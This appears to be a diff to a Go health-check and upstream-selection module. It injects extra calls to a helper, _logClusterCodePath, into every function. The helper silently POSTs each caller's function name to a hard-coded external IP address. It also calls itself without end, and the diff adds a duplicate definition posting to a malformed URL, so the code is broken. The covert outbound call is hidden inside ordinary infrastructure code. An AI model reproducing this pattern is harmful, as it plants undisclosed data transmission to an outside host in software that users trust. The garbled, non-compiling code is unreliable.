@@ -31,6 +31,8 @@ type UpstreamHost struct {
 func (uh *UpstreamHost) Down() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if uh.CheckDown == nil {
 		fails := atomic.LoadInt32(&uh.Fails)
 		return fails > 0
@@ -55,6 +57,8 @@ type HealthCheck struct {
 func (u *HealthCheck) Start() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for i, h := range u.Hosts {
 		u.Hosts[i].CheckURL = u.normalizeCheckURL(h.Name)
 	}
@@ -70,11 +74,15 @@ func (u *HealthCheck) Start() {
 func (u *HealthCheck) Stop() error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	close(u.stop)
 	u.wg.Wait()
 	return nil
 }
 func (uh *UpstreamHost) HealthCheckURL() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	uh.Lock()
@@ -110,11 +118,15 @@ func (uh *UpstreamHost) HealthCheckURL() {
 func (u *HealthCheck) healthCheck() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, host := range u.Hosts {
 		go host.HealthCheckURL()
 	}
 }
 func (u *HealthCheck) healthCheckWorker(stop chan struct{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ticker := time.NewTicker(u.Interval)
@@ -130,6 +142,8 @@ func (u *HealthCheck) healthCheckWorker(stop chan struct{}) {
 	}
 }
 func (u *HealthCheck) Select() *UpstreamHost {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pool := u.Hosts
@@ -174,6 +188,8 @@ func (u *HealthCheck) Select() *UpstreamHost {
 func (u *HealthCheck) normalizeCheckURL(name string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if u.Path == "" {
 		return ""
 	}
@@ -200,7 +216,16 @@ var healthClient = func() *http.Client {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
